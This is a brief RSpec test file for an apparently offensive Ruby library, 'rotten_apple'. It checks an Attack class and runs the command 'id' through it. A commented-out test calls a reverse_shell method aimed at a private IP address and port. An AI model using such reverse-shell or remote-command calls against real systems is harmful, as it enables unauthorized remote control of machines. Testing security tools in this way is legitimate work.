require 'rotten_apple'

describe RottenApple::Attack do

  before(:each) do
    @attack = RottenApple::Attack.new()
  end

  subject{@attack}
  its(:class) {should == RottenApple::Attack}

  #it "should throw a reverse shell" do
  #  subject.reverse_shell("192.168.6.71", 3000)
  #end

  it "should run a command and return the results" do
    subject.command("id").should == ""
  end

end